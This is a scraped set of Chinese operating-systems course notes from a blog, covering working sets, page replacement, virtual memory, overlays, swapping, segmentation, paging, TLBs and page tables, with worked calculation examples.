是工作集窗口 Working-set window，一个定长页面访问的时间窗口 $W(t, \\tau )$ 是工作集的大小，即逻辑页的数量. 如果 Example ($\\tau = 10$ ):\nt1 → WS = {1,2,5,6,7}\nt2 → WS = {3,4}\n由此可知，\n工作集是工作集窗口中的页面集 工作集是窗口是一个移动的窗口，表现形式为对每个内存的引用。 当一个新的引用出现在窗口中，对应的页将被标记位该工作集中的成员 最旧一端的引用将从工作窗口中弹出，相应的页就不会再被标记位工作集中的成员了。 例如：如图所示：一个请求序列，假设 $\\tau = 10$ ，则应该如何计算工作集？\n工作集大小的变化 : 进程开始执行后，随着访问新页面逐步建立较稳定的工作集。当内存访问的局部性区域的位置大致稳定时，工作集大小也大致稳定；局部性区域的位置改变时，工作集快速扩张和收缩过渡到下一个稳定值。\nti WS t1 {1,2,5,6,7} t2 {1,5,6,7} t3 {1,2,5,6,7} t4 {1,2,3,5,6,7} t5 {1,2,3,4,5,6,7} Reference\nComputing the working set\n常驻集 常驻集是指在当前时刻, 进程实际驻留在内存当中的页面集合.\n工作集是进程在运行过程中固有的性质，而常驻集取决于系统分配给进程的物理页面数目，以及所采用的页面置换算法; 如果一个进程的整个工作集都在内存当中，即常驻集 包含 工作集, 那么进程将很顺利地运行，而不会造成太多的缺页中断(直到工作集发生剧烈变动, 从而过渡到另一个状态); 当进程常驻集的大小达到某个数目之后，再给它分配更多的物理页面，缺页率也不会明显下降。 工作集页面置换算法 如图所示，跟踪最后一个 $\\tau$ 参考（不包括断层参考）\n最后一次$\\tau$ 内存访问期间引用的页面是工作集 $\\tau$ 被称为窗口大小 例如，工作集大小为$\\tau=4$ 0时刻，被引用的页面为 a d e 此时 工作集窗口为 {-2, -1, 0}\n时刻1，工作集窗口为 {-2, -1, 0, 1} 工作集为{a c d e}\n时刻2，此时工作集窗口 {-1, 0, 1,2 } 而 工作集为 {a c d} 因为 e已经不在工作集窗口内了。\n时刻4，产生缺页中断，此时将a换出，因为a已经不在工作集窗口内了\n时刻6，产生缺页，将e换入工作集 此时工作集为 {b c e d}\n时刻7，因d不在工作集窗口内，则将d换出，此时工作集为 {b c d}\n缺页率页面置换算法 计算工作集的另一种方法：\n尝试最小化页面错误 当缺页率较高时，增加工作集 当缺页率较低时，减少工作集 缺页率页面置换算法 Page-Fault-Frequency Page Replacment，即可变分配策略：常驻集大小可变。 例如 : 每个进程在刚开始运行的时候, 先根据程序大小给它分配一定数目的物理页面, 然后在进程运行过程中, 再动态地调整常驻集的大小.\n可采用全局页面置换的方式，当发生一个缺页中断时，被置换的页面可以是在其他进程当中，各个并发进程竞争地使用物理页面。 优缺点：性能较好，但增加了系统开销。 具体实现：可以使用缺页率算法来动态调整常驻集的大小. 缺页率： $缺页次数 \\div 内存访问次数$；\n影响因素 :\n页面置换算法 分配给进程的物理页面数目 页面本身的大小 程序的编写方法 缺页集算法实现：保持跟踪缺页发生的概率，当出现缺页异常时，计算并记录从上一次缺页异常起到现在的时间。上次最后一次缺页异常的时间 tlast\n如果两次缺页异常间隔时间 “很大”，则减少工作集\n如果 $t_{current} - t_{last} \u0026gt; \\tau $，则从内存中移除 [$t_{current}$ , $t_{last}$]时间内没有被引用的页。 如果两次缺页异常间隔时间 “很小”，则增加工作集\n如果 $t_{current} - t_{last} \u0026lt; \\tau $，则将缺失的页增加到工作集中。 示例：假设窗口大小为2 $\\tau = 2$\n如果当 $t_{current} - t_{last} \u0026gt; 2$，则移除 [$t_{current}$ , $t_{last}$]时间内没有被引用的页。\n如果当 $t_{current} - t_{last} \u0026lt; 2$，则将缺失的页增加到工作集中\n时刻1：产生缺页异常\n时刻4：产生缺页异常，此时 $t_{current} - t_{last} = 4-3 \u0026gt; 2$，此时工作集窗口为{1,2,3,4}，工作集为 {a,c,d,e}则在工作集窗口内没有被访问到的 a,e 则被从工作集中清除。\n时刻6：产生缺页异常，此时 $t_{current} - t_{last} = 6-4 \\leq 2$，此时工作集窗口为{6,5,4}，工作集为 {b,c,d}；此时增加工作集，将e增加到工作集中\nReference\nPage Fault Frequency\n抖动问题 抖动问题是对工作集与常驻集问题的深入\n工作集：程序在执行过程中对内存访问的固有属性 常驻集：当前程序要访问那些页面放到内存中来 如果分配给一个进程的物理页面太少，不能包含整个的工作集, 即常驻集 属于工作集，那么进程将会造成很多的缺页中断，需要频繁的在内存与外存之间替换页面，从而使进程的运行速度变得很慢，我们把这种状态称为 \u0026ldquo;抖动\u0026rdquo; Thrashing 。\n产生抖动的原因：随着驻留内存的进程数目增加, 分配给每个进程的物理页面数不断就减小, 缺页率不断上升. 所以OS要选择一个适当的进程数目和进程需要的帧数, 以便在并发水平和缺页率之间达到一个平衡.\n更好的负载控制标准：调整MPL，以便：\n平均缺页间隔时间（ means time between page faults MTBF）= 缺页服务时间（ page fault service time PFST）\n$\\sum WS_i = Size of memory$\n","permalink":"https://www.oomkill.com/2022/04/ch6-page-replacement-algorithms/","summary":"","title":"ch6 页面置换算法"},{"content":"Objective 覆盖技术 交换技术 虚拟内存 目标 程序局部性原理 基本概念 基本特征 虚拟页式内存管理 覆盖技术 overlay 在固定分区中的主要遇到的问题是进程的大小受到分区的最大大小的限制，这将意味着一个进程将不能跨越另一个进程。为了解决这个问题，早期使用了称为覆盖(overlay) 的解决方案，覆盖技术是为了在较小的可用内存中运行较大的程序。常用于多道程序系统，与分区存储管理配合使用。这样并非所有模块都需要同时存在于内存中，实现了运行大于物理内存大小的程序的技术。\n覆盖技术的原理： 将程序按照执行逻辑拆分为多个功能上相对独立的部分（overlays）, 那些不会同时执行的模块共享同一块内存区域, 按时间先后来运行（分时）。 必要部分，常驻内存的代码和数据，负责管理，在某个时间片将相应的程序和数据导入或导出内存。 可选部分，在其他程序模块中实现, 平时存放在外存中, 在需要用到时才装入内存; 不存在调用关系的模块不必同时装入到内存, 从而可以相互覆盖, 即这些模块共用一个分区. 覆盖技术实例 覆盖技术说明：\n有一个程序，分位A B C D E F G 六个模块，每一个模块占用了一定空间，程序的覆盖树如图所示。\n问：当满足加载（和运行）该程序所需物理内存中的大小是多少？\n使用覆盖技术，实际上不需要将整个程序放在主内存中。只需要在对应时间片时所需要的部分即可，其逻辑调用关系树可以分为：Root-A-D或者 Root-A-E ; Root-B-F 或 Root-C-G 部分。\nRoot是常驻内存，因为其需要调用A B C D E F G 六个模块，占用2KB\n如图：加载与运行改程序所需的物理内存大小是多少？\n​\t(a) 12 KB\n​\t(b) 14 KB\n​\t(c) 10 KB\n​\t(d) 8 KB\n答：由公式可得，最大运行层所需的物理内存为14KB，即拥有 14KB 大小的分区就可以运行上图任意一个分区\nRoot+A+D = 2KB + 4KB + 6KB = 12KB\rRoot+A+E = 2KB + 4KB + 8KB = 14KB\rRoot+B+F = 2KB + 6KB + 2KB = 10KB\rRoot+C+G = 2KB + 8KB + 4KB = 14KB\r如图所示，Overlay Driver ,也就是root区，是一个由用户负责如何覆盖的代码段，并不是操作系统提供的功能。这就意味着Overlay模式下需要用户自行去管理内存，这就是所谓的Overlay Driver，通俗来讲，Overlay Driver 是帮助整个程序如何换入换出各个部分的代码。\n覆盖技术的优缺点 **优势 **\n减少内存需求 减少时间要求 **坏处 **\n覆盖的关系必须由开发者去指定 开发者需要知道整个程序所需的内存 覆盖的模块必须完全没有交集 交换技术 交换技术(swapping)，是操作系统实现的一种内存交换机制，与覆盖技术最大的不同是，覆盖技术是由开发者在程序内实现的内存交换机制，而swapping则是操作系统实现的内存交换机制。\n实现原理：可将暂时不能运行的程序送到外存，从而获得空闲内存空间。操作系统把一个进程的整个地址空间的内容保存到外存中(换出 swap out)，而将外存中的某个进程的地址空间读入到内存中(换入 swap in)。换入换出内容的大小为整个程序的地址空间。\n![交换](../../../images/ch5 Virtual Memory/Swapping.jpg)\n交换技术存在的问题 交换时机的确定：何时需要发生交换? 只当内存空间不够或有不够的危险时换出; 交换区的大小：必须足够大以存放所有用户进程的所有内存映像的拷贝，必须能够对这些内存映像进行直接存取 程序换入时的重定位：换出后再换入的内存位置一定要在原来的位置上嘛?(可能出现寻址问题) 最好采用动态地址映射的方法 交换技术与覆盖技术的比较 覆盖技术是一种编程方法（换入换出单位为程序内的一个模块），用来解决程序大于计算机主内存的限制，在嵌入式系统中通常会考虑该技术。\n交换技术是操作系统中内存交换的机制，换入换出单位是在内存中一个程序为单位，无需开发者给出各个模块之间的逻辑覆盖结构。\n在内存不够用的情形下, 可以采用覆盖技术和交换技术, 但是 :\n覆盖技术：需要程序要自己把整个程序划分为若干个小的功能模块, 并确定各个模块之间的覆盖关系, 增加了程序员的负担. 交换技术 : 以进程作为交换的单位，需要把进程的整个地址空间都换入换出, 增加了处理器的开销. 虚拟内存技术 Objective 像覆盖技术那样，不用把程序的所有内容都放在内存中，因而能够运行比当前的空闲内存空间还要大的程序。但做的更好，由操作系统自动来完成，无需程序员的干涉。\n像交换技术那样，能够实现进程在内存与外存之间的交换，因而获得更多的空闲内存空间。但做的更好，只对进程的部分内容在内存和外存之间进行交换。\n![虚拟内存](../../../images/ch5 Virtual Memory/virtual_memory.jpg)\n程序局部性原理 程序的局部性 (principle of locality)，是虚拟内存中重要组成的概念，表明了，程序在操作系统中运行期间在任意的时间内只需要访问整个内存中的一小部分。有个这个概念就可以对操作系统的内存进行优化，从而获得更好的整体性能。局部性又可分为：\n时间局部性：时间局部性(Temporal locality)是指，访问过的内存地址很快又会被再次访问，例如：在循环中，循环变量每次迭代期间都会被访问到。 空间局部性：空间局部性(Spatial locality)是指，在特定时间访问过的内存位置，则很可能很快就会引用其附近位置的内存地址，例如：在数组中，常规情况下，访问完数组的第一个元素会直接访问数组的下一个元素。 顺序局部性：所谓顺序局部性(Sequential locality)，是指内存位置按升序或降序顺序方法被访问。 分支局部性：分支局部性( Branch locality)，在计算机中，大多数指令是顺序执行的，这种情况通常发生在分支情况下，当在简单结构或分支中，所需要访问的内存地址仅限于在一个小范围内。 等距局部性：等距局部性(Equidistant locality)位于空间和分支之间，是指如果某个位置被访问，那和它相邻等距离的连续地址极有可能会被访问到。 Reference\nexplame of locality\nlocality of reference\n实例：为什么下列代码有问题?\n页面大小为4k，但会产生4M大小。分配给每个进程的物理页面是1\n在一个进程中, 定义了如下的二维数组 int A[1024][1024]. 该数组按行存放在内存, 每一行放在一个页面中。考虑一下程序的编写方法对缺页率的影响?\n# Option #1\rfor (j = 0; j \u0026lt; 20; j++)\rfor (i = 0; i \u0026lt; 200; i++)\rx[i][j] = x[i][j] + 1;\r## Option #2\rfor (i = 0; i \u0026lt; 200; i++)\rfor (j = 0; j \u0026lt; 20; j++)\rx[i][j] = x[i][j] + 1;\roption1，按照行访问\na(0,0) a(1,0) a(2,0) \u0026hellip;. a(1023,0) a(0,1) a(1,1) a(2,1) \u0026hellip;. a(1023,1) option #2 按照列访问\na(0,0) a(0,1) a(0,2) \u0026hellip;. a(0,1023) a(1,0) a(1,1) a(1,2) \u0026hellip;. a(1,1023) option #1 每个数据值占用1页，总共$1024X 1024$页，会发生$1024X 1024$ 次page fault\noption #2 总共会发生1024次 page fault\n基本特征\n大的用户空间：通过把物理内存和外存相结合, 提供给用户的虚拟内存空间通常大于实际的物理内存，即实现了这两者的分离。如32位的虚拟地址理论上可以访问4GB，而可能计算机上仅有256M的物理内存，但硬盘容量大于4GB。 部分交换：与交换技术相比较，虚拟存储的调入和调出是对部分虚拟地址空间进行的; 不连续性： 物理内存分配的不连续性，虚拟地址空间使用的不连续性。 虚拟页式内存管理 请求调页 Demand Paging 当用户程序要调入内存运行时，不是将该程序的所有页面都装入内存，而是只装入部分的页面，就可启动程序运行。\n在运行的过程中，如果发现要运行的程序或要访问的数据不再内存，则向系统发出缺页的中断请求，系统在处理这个中断时，将外存中相应的页面调入内存，使得该程序能够继续运行。\n为了能够实现请求调页和页面置换，需要在页表项中增加一些位(bit)，来辅助完成该功能。\n![image-20220320174819945](../../../images/ch5 Virtual Memory/image-20220320174819945.png)\n访问位或引用位（Reference bit）：如果该页被访问过(包括读写操作)，则设置此位，用于页面置换算法。\n修改位（Modified bit (or “dirty bit”)）：表示此页在内存中是否被修改（写）过；当系统回收该物理页面时，根据此位来决定是否把它的内容写回辅存\n保护位 Protection bits (RWX)：能否访问该页,, 如只读, 可读写, 可执行等\n驻留位或存在位 present/absent bit or resident bit ：表示该页是在内存中还是在外存；逻辑页号与物理页帧相对应。\nReference\nPage State\nMapping Pages to Page Frames\n如图所示：\nVirtual memory: 64KB\nPhysical memory: 32KB\nPage size: 4KB\nVirtual memory pages: 16\nPhysical memory pages: 8\n![image-20220320175528794](../../../images/ch5 Virtual Memory/image-20220320175528794.png)\n当虚拟内存页第一项为2，那么代表物理页帧为2的项，公式则为 $vmItme \\times page size= 2\\times4069=8192$\n页式内存管理的处理流程 什么是缺页中断 在操作系统中，进程和内核都会通过页表项(PTE)，来访问一个物理页面的，访问一个目前并未被加载在物理内存中的一个页面时，由MMU引发异常，触发缺页中断 Page Fault。通常情况下，缺页中断不能被准确说为是一种异常错误，而是操作系统内存管理的一种机制，通过这一机制可以实现增加程序可用的内存空间。\n内存管理中的处理流程 ![image-20220320180502614](../../../images/ch5 Virtual Memory/image-20220320180502614.png)\n由图可知：\n第一部，CPU Load内存地址，如果有对页面的引用，首先对该页面的引用将追溯到操作系统（第二步），否则产生 Page Fault 到第四步 操作系统查看页表，请求无效则终止，如不在内存中就进行加载到内存中 第二步，找到空闲帧 第三步，使用页面置换算法，从辅存中调度到物理页帧中，换出前修改标记位 第四步，重置页表项标记位为1 第五步，重启导致 Page Fault 的指令 Reference\nPage Fault\n后备存储 后备存储（有时称为辅助存储）是所有其他存储数据的设备的统称：如硬盘\n一个虚拟地址空间的页面可以被映射到一个文件(在二级存储中)的某个位置 代码段 : 映射到可执行二进制文件 动态加载的共享库程序段 : 映射到动态调用的库文件 其他段 : 可能被映射到交换文件(swap file) 虚拟内存性能计算 effective memory access time ETA 是指有效的内存访问时间，计算EAT的公式如下：\nP：页表命中率\n1-P：缺页率\n$EAT= P \\times hit \\quad memory \\quad time + (1-P) \\times miss \\quad memory \\quad time. $​\n例如：在 TLB 找到页的百分比称为命中率。 80% 的命中率意味着在 80% 的时间在 TLB 中找到所需的页码。 如果搜索 TLB 需要 20 纳秒，访问内存需要 100 纳秒，那么当页码在 TLB 中时，映射内存的访问需要 120 纳秒。\n如果在 TLB 中找不到页号（20 纳秒），那么必须首先访问内存中的页表和帧号（100 纳秒），然后访问内存中所需的字节（100 纳秒），总共 220 纳秒。 为了找到有效的内存访问时间，则需要权衡有效的内存访问的概率：\n$EAT = 0.80 \\times 120 + 0.20 \\times 220 = 140 \\quad nano seconds$​\n例2：已知内存访问时间是10millisecond，缓存访问时间为10microseconds。设，TLB命中率15%，则有效内存访问时间是多少\n$EAT = 0.15\\times(10+0.001)+(1-0.15)\\times(10\\times2 + 0.001)$​\n例3：\n已知TLB命中率为 70%，TLB 访问时间为 30ns，访问主存时间为 90ns，则有效内存访问时间是多少\n$0.7 \\times (30+90) + (1-0.7) \\times (30+90\\times2)$​\n$0.7\\times 120 + 0.3\\times210 = 84+63=170$​\nReference\nETA\ncalculate the effective access time\nhttps://courses.engr.illinois.edu/cs423/sp2018/slides/15-memory.pdf\n","permalink":"https://www.oomkill.com/2022/04/ch5-virtual-memory/","summary":"","title":"ch5 虚拟内存"},{"content":"overview Q1: 为什么需要非连续内存分配\n连续内存管理 （contiguous memory allocation）, 即 : 操作系统加载到内存以及程序加载到内存中时, 分配一块连续的内存块. 但这种方式会出现碎片问题，而非连续内存分配（Non-contiguous memory allocation ）可以有效的减少碎片（Fragmentation）的出现。\nQ2: 主要的非连续内存分配的管理方法\n分段（Segmentation） 分页（Paging） 页表 （Page Table） 1.非连续内存分配的必要性 连续内存管理的缺陷：\n内存利用率较低（memory wastage），在程序运行时分配的内存是增长的，但在进程使用为达到分配大小时，分配的块并未使用，并且也不能给其他进程使用，造成了内存的浪费。 分配给一个程序的物理内存必须是连续的。 碎片化问题 不灵活（inflexibility），当进程或文件使用的内存超出预期时（即：超出分配的内存块大小），将停止并抛出异常，例如：No disk space。 非连续内存分配的优点:\n一个程序的物理地址空间是非连续的 更好的内存利用和管理，（减少了内存浪费） 允许共享代码与数据(共享库等\u0026hellip;) 支持动态加载和动态链接 非连续内存分配的缺点：\n建立虚拟地址和物理地址的转换难度大 软件方案 硬件方案(采用硬件方案) : 分段 / 分页 分段（segmentation） 首先 segmentation mechanism需要考虑的问题：\n程序的分段地址空间 分段寻址方案 什么是segmentation 段（segmentation）是一个逻辑单元 (logical unit)，例如：\n主程序 main program 程序（主要是指功能的代码，如一段函数） procedure 函数 function 方法 method 对象 object 局部变量和全局变量 local variables, global variables 公共块 common block 堆 stack 符号表 symbol table 数组 arrays [segmentation的逻辑视图]\r可以看到左边是逻辑地址，右边是不连续的物理地址，中间有一个映射机制将两边建立了一个关联关系（ST Segment Table）。通过映射机制将不同的块（如stack，function..）分别映射到内存中的段中。\n分段寻址方案 一维逻辑地址与分段的物理地址对应的方法，分段寻址 （Segmentation Addressing modes），逻辑地址由两部分组成，segment number (==s==) 和 offset (==d==)。\ns 表示段所需的总位数 d 指定了段大小所需的位数 基于硬件的分段管理机制 Segmention hardware 程序表示为了一个二维地址，但在实际物理内存中是一个一维地址。因此需要将二位地址 （ two-dimensional）映射为一个一维物理地址 (one-dimensional)，这个机制就是段表 （Segment Table）,ST映射了逻辑地址的段号和物理地址的段号。并且段的长度与起始信息也是存放在ST中的。\n段表（ST）中的每个条目都有一个base和一个段 limit。==base== 包含段所在在内存中的起始物理地址，而==limit==指定段的长度。\n如图所示，逻辑地址由两部分组成：s和d。s 作为 ST 的 index 。d必须在0和 limit 之间。当超出limit范围是，CPU会产生异常。当 d 合法时，将其添加到 base 以生成地址物理地址。\n起始物理地址 = d + base\n结束物理地址 = base + limit\n分页(Paging) overview 本章主要分为两部分：\n分页地址空间 页寻址方式 分页 (Paging) 与 分段 (Segmentation) 都是非连续性内存管理的机制，分段允许进程的物理地址空间不连续；而分页则是比分段较有优势的另一种内存管理方案。\n分页的特点:\n将每个块划分为固定的页。 划分物理内存为固定大小( fixed-sized ) 的块 (block) 称作帧 ( frame ） 大小是2的幂, e.g. 512 / 4096 / 8192 逻辑地址相同大小的的块 (blocks) 称作 (Pages) 大小是2的幂, e.g. 512 / 4096 / 8192 每个段需要一个页表。 CPU的内存管理单元需要同时支持 分页和分段。 帧 Frame 物理地址 （Physical Address）空间在划分为若干固定大小的块，称为帧。帧由两部分组成，Frame number(f) 和 Frame offset(==d==)\nFrame number(f): 表示物理地址空间的帧所需的位数。 Frame offset(d): 表示页中物理地址空间的页大小或页或页偏移量的字数所需的位数。 如图所示，物理地址是一个二元组 $(f,d)$，页帧占 $F$ 位，共有 $2^F$ 帧；偏移量 o 占了 $S$ 位（一个帧的大小），共$2^S$ 字节 ，则物理地址 = $2^S\\times f+d$ 。\n地址计算：16bit的物理地址空间，页帧大小为9bit（512byte）\n给出物理地址$(f,d) = (3,6)$，求物理地址的位置 。 $S=9$，$F=7$， $f=3$ ，$d=6$ 套用公式得出，$2^9\\times3+6 = 1542$ 页 Page 逻辑地址相同大小的的块 (blocks) 称作 (Pages)，\n页的偏移的大小=帧内偏移的大小 页号 \u0026lt;\u0026gt; 帧号大小 Page也有两部分组成，页号和页的偏移。Page number(==p==) 和 Page offset(==d==)；\nPage number(p) 逻辑地址空间中页所需的位数 Page offset(d)：逻辑地址空间中页偏移量的字数所需的位数。 如图所示，一个逻辑地址表示为一个二元组 $(p,d)$，页帧占 $P$ 位，共有 $2^P$ 帧；偏移量 o 占了 $S$ 位 (一个页的大小)，共$2^S$ 字节 ，则物理地址 = $2^S\\times p+d$ 。\n页的寻址机制 在图中可以看出，逻辑地址是一个连续的地址空间，并且由一个个Page组成，首先CPU寻址，地址分位两块（一个二元组）$(p,d)$，p作为一个index 去查一个page table (以页号为索引的值为帧号) ，以index与base（基地址）作为查找项查找对应的f，$f + (f)d$ 就找到了对应的物理地址。\n页映射到帧 页是连续的虚拟内存 帧是非连续的物理内存 不是所有的页都有对应的帧 页表 overview 页表（page table）结构：页表虚拟内存统用来存储逻辑地址 (Virtual Address) 到物理地址 ( Physical Address ) 映射关系的一种数据结构。\n页表的特性：\n在页表中，每个映射被称为页表项（Page Table Entries (PTEs)）这个页表项负责逻辑地址到物理地址的转换。 该表存储在页表基址寄存器（PTBR ，``Page-table base register`） 随进程运行状态而动态变化。 页表项（PTE） 的组成：\n物理页号（Physical Page Number PPN）\nDPN（disk page number）的磁盘上的页面\n帧号\n标记位\n脏位/修改位（Dirty Bit (D)）：每个PTE都包含的一个修改位，表示页面自加载后是否已写入。是在操作系统中完成，而不是在硬件中完成的操作。 1：表示数据是\u0026quot;脏的（dirty）\u0026quot;，即已写入。 0：数据是“干净的(clean)”，与加载时相同。 存在位/驻留位 (resident bit (R))：每个PTE都包含的一个驻留位，表示逻辑地址是否有一个物理地址与其相对应。 1：当逻辑页在物理内存中时，该位被设置为1。 0：如果为0，则访问该虚拟页面将导致页面错误。 引用位 (Eviction Bit ，In x86: Reference Bit)，过去一段时间内是否有对其引用（是否访问过页内的某个存储单元）。存在页表的第二位，在每次访问页面时（读/写），Reference Bit设置为1。 1：最近被引用过。 0：从未被引用。 Read/Write Bit NX Bit 页表的转换 （translation process） CPU的内存单元（MMU， memory management unit）根据程序的page的页号的若干位, 计算出索引值index, 在页表中搜索这个index, 得到的是帧号, 帧号和原本的offset组成物理地址.\nQuick Activity\n具有16位地址的计算机系统，物理地址大小32KB，每页大小1024bites，的逻辑地址如何进行转换。\n16位地址是0~15，0~9是页内偏移 d, 10~15是页号。\n页式存储管理机制存在的问题 内存访问性能问题(Performance Issues)：内存访问性能，虚拟地址访问需要2次内存访问 第一次获取页表项 第二次访问数据 页表大小问题：页表可以非常大。 页表可能很大 如图实例，32K内存，每页1K，即32个页表项，如果每项占4byte，则为128byte。 对于具有64位地址和1024字节页的机器，页表的大小是多少？ 页：$2^{64}$，页的大小：$2^{10}$，需要建立页表的大小：$2^{64} \\div 2^{10} = 2^{54}$ 如何解决上述问题(what to do)：\nCaching 缓存，solution：快表，利用缓存机制减少对页表的访问。 Indirection 间接访问，solution：多级页表，通过间接引用的方式来减少页表的长度。 快表 translation look-aside buffers (TLBs) 对于上述的性能问题，有效的解决方法是对页表项（PTE）的高速缓存，成为快表（translation look-aside buffer (TLB)）。快表就是将近期访问过的页表项在CPU内部使用硬件缓存，即将近期访问过的项缓存到CPU中；TLB由内存管理单元（MMU）管理\n[未使用页表的情况]\r[TLB mechanics]\r如图所示，如果TLB命中，则直接可以获取到物理地址，如果TLS未命中，则同时将内容缓存到CPU中的TLB。\n多级页表 多级页表是通过间接引用的方式将页号分成多级。多级页表是树状结构，用于保存页表。\n例子，考虑两个级别的页表再次在具有$2^{12}=4$ KB Page 的32-bit架上，\nQ1：第二级页面表格有多少位？\n$4KB\\div4B = 1024=2^{10}$ Q2：顶级页表有多少位？\n$32-12-10=10$ 10bits 表示0级索引，10bits表示1级索引，12bits表示页面内的偏移量。每一个子页表的开头作为上一个页表的页号物理页号填写到上一级页表当中。\n多级页表计算题 一个32位操作系统中进程的虚拟地址空间可达到4GB，假设用户地址空间为2GB，页面大小为4KB，\nQ1：则一个进程最多可以有（）页。\n$2G = 2\\times 2^{10} \\times 2^{10} \\times 2^{10} = 2^{31} $​ $4KB = 2^2 \\times 2^{10} = 2^{12}$​​ 即 $2^{31}\\div2^{12} = 2^{19}$​​ Q2：若用4个字节表示一页的物理页号，则页表本身就占用（）？\n$4B\\times 2^{19} = 2^2 \\times 2^{19} = 2^{21} = 2M\t$ Q3：即需要（）个页面存放。\n$2M\\div4KB = 2^{21}\\div2^{12} = 2^{9} = 512$ 反置页表 使用页寄存器(Page Registers)，又名反置页表(Inverted page table (IPT))，是为了减少所占用存储空间的一种做法。使用反置页表的原因是在大地址空间(64-bits)的系统上，多级页表会变得繁琐，例如，逻辑地址空间增长速度快于物理空间地址。（以页帧号为索引，页表号为内容 ）\n此时产生一个问题：如何查找？（frame number是索引，pagenumber是内容）。基于关联存储器（associative memory）的方案：\n关联存储器也可以并行的查找，与寄存器可以同时比较，如果找到匹配值，则输出与键对应的值。\n如果帧数较少，页寄存器可以被放置在关联内存中 在关联内存中查找逻辑页号 关联存储器的代价：\n如果帧数较少，页寄存器可以被放置在关联内存中；在关联内存中查找逻辑页号：\n成功，则拿到帧号 失败，也错误异常（page fault） 限制因素：很难在单个时钟周期完成；耗电。\nIPT的具体思路为，不让页表与逻辑地址空间的大小对应，而是让页表与物理地址空间大小相对应，每个帧都与一个寄存器相关联，通常该寄存器包含：\n引用位(Residence bit）：标记该帧(Frame) 是否被进程占用。 占用页号(Occupier)：页帧对应的页号 保护位(Protection bits)：约定页的访问方式(R/W) Quick Activity\n系统有\n物理内存大小：16MB( $4096 \\times 4096 = 4K \\times 4K = 16MB $ ) 页大小为：4KB( $4096bytes = 4KB $​​​​) 页帧数为4K(4096)。 假定每一个页寄存器(page resigter)占8bytes， $4096 \\times 8 = 32Kbytes$。 那么页寄存器占用的开销为： $32Kb\\div 16Mb \\approx 0.2%$​​。此时和虚拟地址没有关联了。创建​的进程的物理地址就与页寄存器对应。\n页寄存器方案的优缺点：\n优点： 页表大小相对于物理内存而言很小 页表大小与逻辑（虚拟）地址无关 缺点： 页表信息对调后，需要帧号可以找到页号 在页寄存器中搜索逻辑地址中的页号 基于hash计算的反向页表 hash table hash table，一个数学计算的方法。通过hash计算输入为page number，输出为 frame number。由图所示\nVirtual Page Number (VPN): p, q Page Frame Number (PFN): r Offset: d Hash Function: h(x) Hashed Page Table with schema (key, VPN, PFN, Pointer to next entry with key) 每一个页表项 hash table方式的工作流\n操作系统从CPU拿到 虚拟内存 p，并执行 h（p） 以获取 same_key。\n操作系统查找哈希页表中的第一个条目，其中 key = same_key，并根据第一个页表的 虚拟内存页号 p。(根据第一个项中的指针来查找第二个项。它知道第二个项具有相同的键 = same_key，因为多级页表工作流是如此。操作系统根据第二项的页表号字段检查p。\n操作系统从第二个条目中获取帧号 r。r 对应于虚拟页号 p 的正确物理帧号；操作系统使用 页帧r + 偏移量 d 在物理内存中查找它想要的物理地址。\n由图可以看出，为了提高效率，可以对hash函数增加一个参数 pid ，可以作为输入，来设计一个hash函数，算出对应的frame number。这种可以很好的解决映射的开销。\n段页式存储管理 段页式存储管理机制 ( Segmented Paging )，是从页式与段式两种技术中获得最佳特性，纯分段不是很流行，并且在许多操作系统中都没有使用。但是，分段可以与分页相结合。段式存储在内存保护方面有优势，页式存储在内存利用和转移到后备存储方面有优势。\n段页式存储管理机制是在段式存储的基础上给每一个段加一级页表。即，主存被划分为可变大小的段，这些段又被进一步划分为固定大小的页，此时就有三个定义词Definitions 段号 **Segment Number ** 页号 **Page Number ** 页偏移 **Page Offset ** 如图所示，通过为每个段创建页表，可以减小页表的大小（要实现这一点，需要硬件支持），CPU提供的地址现在将被划分为段号、页号和偏移量。\n段页式存储机制工作流如图所示：\nCPU生成一个逻辑地址分为两部分：段号和段偏移量。段偏移必须小于段限制。偏移量又分为页码和页偏移。要映射页表中的确切页码，请将页码添加到页表库中。带有页帧号+页偏移组成了实际被映射的物理地址。\n通过只想相同的页表基址，时间进程间的段共享\nhttps://www.cs.utexas.edu/users/witchel/372/lectures/15.VirtualMemory.pdf\nhttps://www.pvpsiddhartha.ac.in/dep_it/lecture%20notes/OS/unit4.pdf\nhttps://www.studytonight.com/operating-system/difference-between-paging-and-segmentation\nhttps://www.utc.edu/sites/default/files/2021-04/2800-lecture8-memeory-management.pdf\nhttps://www.geeksforgeeks.org/paging-in-operating-system/?ref=lbp\nhttps://cw.fel.cvut.cz/old/_media/courses/ae3b33osd/osd-lec6-14.pdf https://www.inf.ed.ac.uk/teaching/courses/os/slides/10-paging16.pdf\n","permalink":"https://www.oomkill.com/2022/04/ch4-non-contiguous-memory-allocation/","summary":"","title":"ch4 操作内存管理 - 非连续内存分配"},{"content":"一 计算机体系结构及内存分层体系 1.计算机硬件体系结构大致分为\nCPU，完成程序的执行控制 主存 （main memory），放置程序代码和数据 I/O（外）设备，配合程序工作。 2.内存分层体系（金字塔结构) 什么是内存结构：CPU所访问的指令和数据在什么地方。\n第一类：位于CPU内部，操作操作系统无法直接进行管理的，寄存器，cache；特点，速度快，容量小\n第二类：主存或物理内存，主要用来放置操作系统本身及要运行的代码；其特点是，容量比cache要大很多，单速度交于cache要慢一些。\n第三类：磁盘，永久保存的数据及代码，当对于主存要慢，容量比主存大很多。\n操作系统的作用可以将数据访问的速度（cache与内存）与存储的大小（硬盘）很好的融合在一起\n3.OS管理内存时需要完成的目标\n① 抽象：逻辑地址空间（将物理内存，外设等抽象成逻辑地址空间，只需要访问对应地址空间)\n② 保护（独立）：操作系统完成隔离机制实现，独立地址空间（每段程序执行时，不受其他程序的影响）\n③ 共享：进程间安全，可靠，有效，进行数据传递，访问相同的内存。\n④ 虚拟化：更多的地址空间（利用磁盘的空间) 4.需要完成在操作系统中管理内存的不同方法\n操作系统层面\n程序重定位\n分段\n分页\n虚拟内存\n按需分页虚拟内存\n硬件层面\n必须知道内存架构 MMU(内存管理单元)：处理CPU的内存访问请求 二 地址空间\u0026amp;地址生成 地址空间的定义\n地址生成器\n地址安全检查\n1.内存地址的定义 ① 物理内存地址：硬件支持的地址空间，如主存（内存）和硬盘，由硬件完成管理和控制 ② 逻辑内存地址：一个程序运行时所需要的内存范围。\n两者间的关系：逻辑地址空间最终是一个存在的物理地址空间，两者间的映射关系是由操作系统来管理的\n2.逻辑地址生成过程（把代码转化为计算机能理解语言） 